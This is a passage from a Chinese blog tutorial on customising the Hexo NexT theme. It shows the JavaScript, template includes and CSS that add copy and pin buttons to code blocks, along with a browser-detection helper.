$(<span class="string">"figure .figcode"</span>);</div><div class="line">    <span class="keyword">if</span> ($figure.length &gt; <span class="number">0</span>) &#123;</div><div class="line">        $(<span class="string">".post-body"</span>).before(<span class="string">'&lt;div id="copyBtn" &gt;&lt;span id="imgCopy" &gt;&lt;i class="fa fa-paste fa-fw"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id="imgSuccess" style="display: none;color: #6FB76F;"&gt;&lt;i class="fa fa-check-circle fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/span&gt;'</span>);</div><div class="line">        $figure.append(<span class="string">'&lt;div class="codePinBtn"&gt;&lt;img id="imgSuccess" src="/article_images/png/Pin_green.png" style="border:none; width: 24px;"&gt;&lt;/div&gt;'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> $codeArea = $(<span class="string">"figure .code"</span>);</div><div class="line">    <span class="keyword">if</span> ($codeArea.length &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">changeToSuccess</span>(<span class="params">item</span>) </span>&#123;</div><div class="line">            $imgOK = $(<span class="string">"#copyBtn"</span>).find(<span class="string">"#imgSuccess"</span>);</div><div class="line">            <span class="keyword">if</span> ($imgOK.css(<span class="string">"display"</span>) == <span class="string">"none"</span>) &#123;</div><div class="line">                $imgOK.css(&#123;</div><div class="line">                    opacity: <span class="number">0</span>,</div><div class="line">                    display: <span class="string">"block"</span></div><div class="line">                &#125;);</div><div class="line">                $imgOK.animate(&#123;</div><div class="line">                    opacity: <span class="number">1</span></div><div class="line">                &#125;, <span class="number">1000</span>);</div><div class="line">                setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                    $imgOK.animate(&#123;</div><div class="line">                        opacity: <span class="number">0</span></div><div class="line">                    &#125;, <span class="number">2000</span>);</div><div class="line">                &#125;, <span class="number">2000</span>);</div><div class="line">                setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                    $imgOK.css(<span class="string">"display"</span>, <span class="string">"none"</span>);</div><div class="line">                &#125;, <span class="number">4000</span>);</div><div class="line">            &#125;</div><div class="line">            ;</div><div class="line">        &#125;;</div><div class="line"></div><div class="line">        <span class="keyword">var</span> clipboard = <span class="keyword">new</span> ClipboardJS(<span class="string">'#copyBtn'</span>, &#123;</div><div class="line">            <span class="comment">// 定制筛选复制</span></div><div class="line">            target: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                <span class="keyword">var</span> node = <span class="built_in">document</span>.querySelector(<span class="string">"[copyFlag]"</span>);</div><div class="line">                <span class="keyword">var</span> child = node.querySelector(<span class="string">".diff-deletion"</span>);</div><div class="line">                <span class="keyword">if</span> (child != <span class="literal">null</span>) &#123;</div><div class="line">                    <span class="keyword">var</span> pre = node.querySelector(<span class="string">"pre"</span>).cloneNode(<span class="literal">true</span>);</div><div class="line">                    child = pre.querySelector(<span class="string">".diff-deletion"</span>);</div><div class="line">                    <span class="keyword">while</span> (child != <span class="literal">null</span>) &#123;</div><div class="line">                        pre.removeChild(child)</div><div class="line">                        child = pre.querySelector(<span class="string">".diff-deletion"</span>);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">var</span> node = <span class="built_in">document</span>.getElementById(<span class="string">'tmpcopy'</span>);</div><div class="line">                    <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</div><div class="line">                        node = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</div><div class="line">                        node.id = <span class="string">'tmpcopy'</span>;</div><div class="line">                        node.style.position = <span class="string">'fixed'</span>;</div><div class="line">                        node.style.width = <span class="string">'0'</span>;</div><div class="line">                        node.style.height = <span class="string">'0'</span>;</div><div class="line">                        <span class="built_in">document</span>.body.appendChild(node);</div><div class="line">                    &#125;</div><div class="line">                    node.innerHTML = <span class="string">''</span>;</div><div class="line">                    node.appendChild(pre);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">return</span> node;</div><div class="line">            &#125;,</div><div class="line">            isSupported: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                alert(<span class="keyword">this</span>.support);</div><div class="line">                <span class="keyword">return</span> <span class="built_in">document</span>.querySelector(<span class="string">"[copyFlag]"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line"></div><div class="line">        clipboard.on(<span class="string">'success'</span>,</div><div class="line">            <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</div><div class="line">                e.clearSelection();</div><div class="line">                changeToSuccess(e);</div><div class="line">                <span class="keyword">var</span> node = <span class="built_in">document</span>.getElementById(<span class="string">"tmpcopy"</span>);</div><div class="line">                <span class="keyword">if</span> (node != <span class="literal">null</span>) node.innerHTML = <span class="string">''</span>;</div><div class="line">            &#125;);</div><div class="line"></div><div class="line">        clipboard.on(<span class="string">'error'</span>,</div><div class="line">            <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</div><div class="line">                <span class="built_in">console</span>.error(<span class="string">'Action:'</span>, e.action);</div><div class="line">                <span class="built_in">console</span>.error(<span class="string">'Trigger:'</span>, e.trigger);</div><div class="line">            &#125;);</div><div class="line">        $(<span class="string">"#copyBtn"</span>).hover(</div><div class="line">            <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                $(<span class="keyword">this</span>).stop();</div><div class="line">                $(<span class="keyword">this</span>).css(<span class="string">"opacity"</span>, <span class="number">1</span>);</div><div class="line">            &#125;,</div><div class="line">            <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                $(<span class="keyword">this</span>).animate(&#123;</div><div class="line">                    opacity: <span class="number">0</span></div><div class="line">                &#125;, <span class="number">2000</span>);</div><div class="line">            &#125;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FigureHover</span>(<span class="params">figure</span>) </span>&#123;</div><div class="line">    <span class="comment">// 移动鼠标拉伸显示代码</span></div><div class="line">    <span class="keyword">var</span> block = $(figure).attr(<span class="string">"block"</span>);</div><div class="line">    <span class="keyword">if</span> (block != <span class="number">1</span>) &#123;</div><div class="line">        <span class="keyword">var</span> codeArea = $(figure).find(<span class="string">".code"</span>)[<span class="number">0</span>];</div><div class="line">        <span class="keyword">var</span> width_code = codeArea.clientWidth;</div><div class="line">        <span class="keyword">var</span> width_Scroll = codeArea.scrollWidth;</div><div class="line">        <span class="keyword">var</span> width_Margin = -<span class="built_in">parseInt</span>($(figure).css(<span class="string">"marginRight"</span>));</div><div class="line">        $codePinBtn = $(figure).find(<span class="string">".codePinBtn"</span>);</div><div class="line"></div><div class="line">        <span class="keyword">var</span> width_Hide = width_Scroll - (width_code - width_Margin);</div><div class="line">        <span class="keyword">if</span> (width_Hide &gt; <span class="number">0</span>) &#123;</div><div class="line">            $(figure).stop();</div><div class="line"></div><div class="line">            $codePinBtn.stop();</div><div class="line">            <span class="keyword">var</span> width_Main = $(<span class="string">"#main"</span>).width();</div><div class="line">            <span class="keyword">var</span> width_Base = $(<span class="string">".main-inner"</span>).width();</div><div class="line">            <span class="keyword">var</span> width_Blank = (width_Main - width_Base) / <span class="number">2</span> - <span class="number">10</span>;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (width_Blank &gt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="keyword">if</span> (width_Hide &lt; width_Blank) &#123;</div><div class="line">                    width_Margin = width_Hide; <span class="comment">//空白区域足够直接显示 全部</span></div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    width_Margin = width_Blank * <span class="number">0.8</span>;</div><div class="line">                &#125;</div><div class="line">                $(figure).animate(&#123;<span class="attr">marginRight</span>: -width_Margin&#125;);</div><div class="line">                $codePinBtn.animate(&#123;<span class="attr">opacity</span>: <span class="number">1</span>&#125;);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        ;</div><div class="line">    &#125;</div><div class="line">    ;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FigureHoverOut</span>(<span class="params">figure</span>) </span>&#123;</div><div class="line">    <span class="comment">// 鼠标移除代码块</span></div><div class="line">    $(<span class="string">"#copyBtn"</span>).animate(&#123;</div><div class="line">        opacity: <span class="number">0</span></div><div class="line">    &#125;, <span class="number">2000</span>);</div><div class="line">    <span class="keyword">var</span> block = $(figure).attr(<span class="string">"block"</span>);</div><div class="line">    <span class="keyword">if</span> (block != <span class="number">1</span>) &#123;</div><div class="line">        $(figure).stop();</div><div class="line">        $(figure).animate(&#123;<span class="attr">marginRight</span>: <span class="string">"0"</span>&#125;);</div><div class="line">        <span class="keyword">var</span> $codePinBtn = $(figure).find(<span class="string">".codePinBtn"</span>);</div><div class="line">        $codePinBtn.stop();</div><div class="line">        $codePinBtn.css(&#123;<span class="attr">opacity</span>: <span class="number">0</span>&#125;);</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">$(<span class="string">"figure"</span>).hover(</div><div class="line">    <span class="comment">// 鼠标移入代码块</span></div><div class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        FigureHover(<span class="keyword">this</span>);</div><div class="line">        <span class="keyword">var</span> block = $(<span class="keyword">this</span>).attr(<span class="string">"block"</span>);</div><div class="line">        <span class="comment">//-------鼠标活动在代码块内</span></div><div class="line">        <span class="comment">//移除之前含有复制标志代码块的 copyFlag</span></div><div class="line">        $(<span class="string">"[copyFlag]"</span>).removeAttr(<span class="string">"copyFlag"</span>);</div><div class="line">        <span class="comment">//在新的（当前鼠标所在代码区）代码块插入标志：copyFlag</span></div><div class="line">        $(<span class="keyword">this</span>).find(<span class="string">".code"</span>).attr(<span class="string">"copyFlag"</span>, <span class="number">1</span>);</div><div class="line">        <span class="comment">//获取复制按钮</span></div><div class="line">        $copyBtn = $(<span class="string">"#copyBtn"</span>);</div><div class="line">        <span class="keyword">if</span> ($copyBtn.lenght != <span class="number">0</span>) &#123;</div><div class="line">            <span class="comment">//获取到按钮的前提下进行一下操作</span></div><div class="line">            <span class="comment">//停止按钮动画效果</span></div><div class="line">            <span class="comment">//设置为 显示状态</span></div><div class="line">            <span class="comment">//修改 复制按钮 位置到 当前代码块开始部位</span></div><div class="line">            <span class="comment">//设置代码块 左侧位置</span></div><div class="line">            $copyBtn.stop();</div><div class="line">            $copyBtn.css(<span class="string">"opacity"</span>, <span class="number">0.8</span>);</div><div class="line">            $copyBtn.css(<span class="string">"display"</span>, <span class="string">"block"</span>);</div><div class="line">            $copyBtn.css(<span class="string">"top"</span>, <span class="built_in">parseInt</span>($copyBtn.css(<span class="string">"top"</span>)) + $(<span class="keyword">this</span>).offset().top - $copyBtn.offset().top + <span class="number">3</span>);</div><div class="line">            $copyBtn.css(<span class="string">"left"</span>, -$copyBtn.width() - <span class="number">3</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;,</div><div class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        FigureHoverOut(<span class="keyword">this</span>);</div><div class="line">    &#125;,</div><div class="line">);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">btnPinClick</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> figure = <span class="keyword">this</span>.parentElement.parentElement;</div><div class="line">    <span class="keyword">var</span> block = $(figure).attr(<span class="string">"block"</span>);</div><div class="line">    <span class="keyword">if</span> (block != <span class="number">1</span>) &#123;</div><div class="line">        $(<span class="string">".post-body"</span>).css(<span class="string">"transform"</span>, <span class="string">"none"</span>);</div><div class="line">        $(figure).attr(<span class="string">"block"</span>, <span class="number">1</span>);</div><div class="line">        $(<span class="keyword">this</span>).find(<span class="string">"img"</span>).attr(<span class="string">"src"</span>, <span class="string">"/article_images/png/Pin_red.png"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $(figure).attr(<span class="string">"block"</span>, <span class="number">0</span>);</div><div class="line">        $(<span class="keyword">this</span>).find(<span class="string">"img"</span>).attr(<span class="string">"src"</span>, <span class="string">"/article_images/png/Pin_green.png"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$(<span class="string">"figure"</span>).unbind(<span class="string">"dblclick"</span>).bind(<span class="string">"dblclick"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">//双击事件</span></div><div class="line">    <span class="keyword">var</span> block = $(<span class="keyword">this</span>).attr(<span class="string">"block"</span>);</div><div class="line">    <span class="keyword">if</span> (block != <span class="number">1</span>) &#123;</div><div class="line">        $(<span class="string">".post-body"</span>).css(<span class="string">"transform"</span>, <span class="string">"none"</span>);</div><div class="line">        $(<span class="keyword">this</span>).attr(<span class="string">"block"</span>, <span class="number">1</span>);</div><div class="line">        $(<span class="keyword">this</span>).find(<span class="string">".codePinBtn img"</span>).attr(<span class="string">"src"</span>, <span class="string">"/article_images/png/Pin_red.png"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $(<span class="keyword">this</span>).attr(<span class="string">"block"</span>, <span class="number">0</span>);</div><div class="line">        $(<span class="keyword">this</span>).find(<span class="string">".codePinBtn img"</span>).attr(<span class="string">"src"</span>, <span class="string">"/article_images/png/Pin_green.png"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;)</div><div class="line"></div><div class="line">$(<span class="built_in">window</span>).resize(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> block;</div><div class="line">    <span class="keyword">var</span> width_Main = $(<span class="string">"#main"</span>).width();</div><div class="line">    <span class="keyword">var</span> width_Base = $(<span class="string">".main-inner"</span>).width();</div><div class="line">    <span class="keyword">var</span> width_Blank = (width_Main - width_Base) / <span class="number">2</span> - <span class="number">10</span>;</div><div class="line">    $copyBtn = $(<span class="string">"#copyBtn"</span>);</div><div class="line">    <span class="keyword">if</span> (width_Blank &lt; $copyBtn.width()) &#123;</div><div class="line">        $copyBtn.css(<span class="string">"display"</span>, <span class="string">"none"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $copyBtn.css(<span class="string">"display"</span>, <span class="string">"block"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $(<span class="string">"figure[block='1']"</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        block = $(<span class="keyword">this</span>).attr(<span class="string">"block"</span>);</div><div class="line">        <span class="keyword">if</span> (block == <span class="number">1</span>) &#123;</div><div class="line">            <span class="keyword">var</span> width_This = $(<span class="keyword">this</span>).width();</div><div class="line">            <span class="keyword">var</span> width_Scroll = $(<span class="keyword">this</span>)[<span class="number">0</span>].scrollWidth;</div><div class="line">            <span class="keyword">var</span> width_Margin = -<span class="built_in">parseInt</span>($(<span class="keyword">this</span>).css(<span class="string">"marginRight"</span>));</div><div class="line"></div><div class="line">            <span class="keyword">var</span> width_Hide = width_Scroll - (width_This - width_Margin);</div><div class="line">            <span class="keyword">if</span> (width_Hide &gt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="comment">//var width_Main  = $("#main").width();</span></div><div class="line">                <span class="comment">//var width_Base  = $(".main-inner").width();</span></div><div class="line">                <span class="comment">//width_Blank = (width_Main - width_Base) / 2 - 10;</span></div><div class="line"></div><div class="line">                <span class="keyword">if</span> (width_Blank &gt; <span class="number">0</span>) &#123;</div><div class="line">                    <span class="keyword">if</span> (width_Hide &lt; width_Blank) &#123;</div><div class="line">                        width_Margin = width_Hide; <span class="comment">//空白区域足够直接显示 全部</span></div><div class="line">                    &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        width_Margin = width_Blank * <span class="number">0.8</span>;</div><div class="line">                    &#125;</div><div class="line">                    $(<span class="keyword">this</span>).css(&#123;</div><div class="line">                        marginRight: -width_Margin</div><div class="line">                    &#125;);</div><div class="line">                    $(<span class="keyword">this</span>).find(<span class="string">".codePinBtn"</span>).animate(&#123;</div><div class="line">                        opacity: <span class="number">1</span>,</div><div class="line">                        left: $(<span class="string">".post-body"</span>)[<span class="number">0</span>].getBoundingClientRect().right + width_Margin - $(<span class="keyword">this</span>).find(<span class="string">".codePinBtn"</span>).width()</div><div class="line">                    &#125;);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    createCopyBtns();</div><div class="line">    $(<span class="string">".codePinBtn"</span>).unbind(<span class="string">"click"</span>).bind(<span class="string">"click"</span>, btnPinClick);</div><div class="line">&#125;);</div></pre></div></div></figure><hr><h1 id="0x02-添加自动改变代码片段js"><a href="#0x02-添加自动改变代码片段js" class="headerlink" title="0x02 添加自动改变代码片段js"></a>0x02 添加自动改变代码片段js</h1><blockquote><p>./themes/next/source/js/src/function.js <code>新增</code></p></blockquote><figure class="highlight js"><figcaption><span class="fileDir">./themes/next/source/js/src/</span><span class="caption">function</span><span class="suffix">.js</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></div><div class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClass</span>(<span class="params">tagName, className</span>) //获得标签名为<span class="title">tagName</span>,类名<span class="title">className</span>的元素</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">document</span>.getElementsByClassName) <span class="comment">//支持这个函数</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="built_in">document</span>.getElementsByClassName(className);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">var</span> tags = <span class="built_in">document</span>.getElementsByTagName(tagName); <span class="comment">//获取标签</span></div><div class="line">        <span class="keyword">var</span> tagArr = []; <span class="comment">//用于返回类名为className的元素</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tags.length; i++) &#123;</div><div class="line">            <span class="keyword">if</span> (tags[i].class == className) &#123;</div><div class="line">                tagArr[tagArr.length] = tags[i]; <span class="comment">//保存满足条件的元素</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> tagArr;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">addEvent</span>(<span class="params">obj, type, fn</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (obj.addEventListener) obj.addEventListener(type, fn, <span class="literal">false</span>);</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (obj.attachEvent) obj.attachEvent(<span class="string">'on'</span> + type, fn);</div><div class="line">    <span class="keyword">else</span> obj[<span class="string">'on'</span> + type] = fn;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeEvent</span>(<span class="params">obj, type, fn</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (obj.removeEventListener) obj.removeEventListener(type, fn, <span class="literal">false</span>);</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (obj.detachEvent) obj.detachEvent(<span class="string">'on'</span> + type, fn);</div><div class="line">    <span class="keyword">else</span> obj[<span class="string">'on'</span> + type] = <span class="literal">null</span>;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">resizePos</span>(<span class="params">obj, callback</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback == <span class="string">"function"</span>) &#123;</div><div class="line">        addEvent(<span class="built_in">window</span>, <span class="string">'scroll'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            callback(obj);</div><div class="line">        &#125;);</div><div class="line">        addEvent(<span class="built_in">window</span>, <span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            callback(obj);</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBrowser</span>(<span class="params">getVersion</span>) </span>&#123;</div><div class="line">    <span class="comment">//注意关键字大小写</span></div><div class="line">    <span class="keyword">var</span> ua_str = navigator.userAgent.toLowerCase(),</div><div class="line">        ie_Tridents, trident, match_str, ie_aer_rv, browser_chi_Type;</div><div class="line"></div><div class="line">    <span class="comment">//判断IE 浏览器,</span></div><div class="line">    <span class="comment">//blog: http://blog.csdn.Net/aerchi/article/details/51697592</span></div><div class="line">    <span class="keyword">if</span> (<span class="string">"ActiveXObject"</span> <span class="keyword">in</span> self) &#123;</div><div class="line">        <span class="comment">// ie_aer_rv:  指示IE 的版本.</span></div><div class="line">        <span class="comment">// It can be affected by the current document mode of IE.</span></div><div class="line">        ie_aer_rv = (match_str = ua_str.match(<span class="regexp">/msie ([\d.]+)/</span>)) ? match_str[<span class="number">1</span>] :</div><div class="line">            (match_str = ua_str.match(<span class="regexp">/rv:([\d.]+)/</span>)) ? match_str[<span class="number">1</span>] : <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="comment">// ie: Indicate the really version of current IE browser.</span></div><div class="line">        ie_Tridents = &#123; <span class="string">"trident/7.0"</span>: <span class="number">11</span>, <span class="string">"trident/6.0"</span>: <span class="number">10</span>, <span class="string">"trident/5.0"</span>: <span class="number">9</span>, <span class="string">"trident/4.0"</span>: <span class="number">8</span> &#125;;</div><div class="line">        <span class="comment">//匹配 ie8, ie11, edge</span></div><div class="line">        trident = (match_str = ua_str.match(<span class="regexp">/(trident\/[\d.]+|edge\/[\d.]+)/</span>)) ? match_str[<span class="number">1</span>] : <span class="literal">undefined</span>;</div><div class="line">        browser_chi_Type = (ie_Tridents[trident] || ie_aer_rv) &gt; <span class="number">0</span> ? <span class="string">"internet-explorer"</span> : <span class="literal">undefined</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">//判断 windows edge 浏览器</span></div><div class="line">        <span class="comment">// match_str[1]: 返回浏览器及版本号,如: "edge/13.10586"</span></div><div class="line">        <span class="comment">// match_str[1]: 返回版本号,如: "edge"</span></div><div class="line">        <span class="comment">//若要返回 "edge" 请把下行的 "ie" 换成 "edge"。 注意引号及冒号是英文状态下输入的</span></div><div class="line">        browser_chi_Type = (match_str = ua_str.match(<span class="regexp">/edge\/([\d.]+)/</span>)) ? <span class="string">"edge"</span> :</div><div class="line">            <span class="comment">//判断firefox 浏览器</span></div><div class="line">            (match_str = ua_str.match(<span class="regexp">/firefox\/([\d.]+)/</span>)) ? <span class="string">"firefox"</span> :</div><div class="line">            <span class="comment">//判断chrome 浏览器</span></div><div class="line">            (match_str = ua_str.match(<span class="regexp">/chrome\/([\d.]+)/</span>)) ? <span class="string">"chrome"</span> :</div><div class="line">            <span class="comment">//判断opera 浏览器</span></div><div class="line">            (match_str = ua_str.match(<span class="regexp">/opera.([\d.]+)/</span>)) ? <span class="string">"opera"</span> :</div><div class="line">            <span class="comment">//判断safari 浏览器</span></div><div class="line">            (match_str = ua_str.match(<span class="regexp">/version\/([\d.]+).*safari/</span>)) ? <span class="string">"safari"</span> : <span class="literal">undefined</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//返回浏览器类型和版本号</span></div><div class="line">    <span class="keyword">var</span> verNum, verStr;</div><div class="line">    verNum = trident &amp;&amp; ie_Tridents[trident] ? ie_Tridents[trident] : match_str[<span class="number">1</span>];</div><div class="line">    verStr = (getVersion != <span class="literal">undefined</span>) ? browser_chi_Type + <span class="string">"/"</span> + verNum : browser_chi_Type;</div><div class="line">    <span class="keyword">return</span> verStr;</div><div class="line">&#125;</div></pre></div></div></figure><hr><h1 id="0x03-插入到主题"><a href="#0x03-插入到主题" class="headerlink" title="0x03 插入到主题"></a>0x03 插入到主题</h1><p>新建文件 <code>custom.swig</code> ，目录如下：（相对目录为工程目录）</p><blockquote><p>./themes/next/layout_custom/custom.swig <code>新增</code></p></blockquote><figure class="highlight js"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/js/src/function.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/lib/zclip/clipboard.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/js/src/custom.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></div></div></figure><p>修改文件 _layout.swig ，目录如下：（相对目录为工程目录）</p><blockquote><p>./themes/next/layout/_layout.swig <code>修改</code></p></blockquote><figure class="highlight html"><figcaption><span class="fileDir">./themes/next/layout/</span><span class="caption">_layout</span><span class="suffix">.swig</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="meta">&lt;!doctype html&gt;</span></div><div class="line">...</div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">class</span>=<span class="string">"&#123;&#123; html_class | lower &#125;&#125;"</span> <span class="attr">lang</span>=<span class="string">"&#123;&#123; config.language &#125;&#125;"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">...</div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">itemscope</span> <span class="attr">itemtype</span>=<span class="string">"http://schema.org/WebPage"</span> <span class="attr">lang</span>=<span class="string">"&#123;&#123; page.lang || page.language || config.language &#125;&#125;"</span>&gt;</span></div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    &#123;% include '_third-party/mathjax.swig' %&#125;</div><div class="line">    &#123;% include '_third-party/scroll-cookie.swig' %&#125;</div><div class="line">    &#123;% include '_third-party/exturl.swig' %&#125;</div><div class="line diff-addition">    &#123;% include '_custom/custom.swig' %&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></div></div></figure><hr><h1 id="0x04-更改button"><a href="#0x04-更改button" class="headerlink" title="0x04 更改button"></a>0x04 更改button</h1><blockquote><p>./themes/next/source/css/_custom/button.styl <code>新增</code></p></blockquote><figure class="highlight css"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line"><span class="selector-class">.codePinBtn</span>&#123;</div><div class="line">  <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> auto;</div><div class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">z-index</span>: <span class="number">1000</span>;</div><div class="line">  <span class="attribute">margin-left</span>: -<span class="number">23px</span>;</div><div class="line">  <span class="attribute">align-self</span>: start;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-id">#copyBtn</span> &#123;</div><div class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</div><div class="line">    <span class="attribute">position</span>: fixed;</div><div class="line">    <span class="attribute">display</span>: block;</div><div class="line">    <span class="attribute">z-index</span>: <span class="number">1000</span>;</div><div class="line">    <span class="attribute">line-height</span>: <span class="number">1</span>;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">1.5em</span>;</div><div class="line">    <span class="attribute">left</span>: <span class="number">18px</span>;</div><div 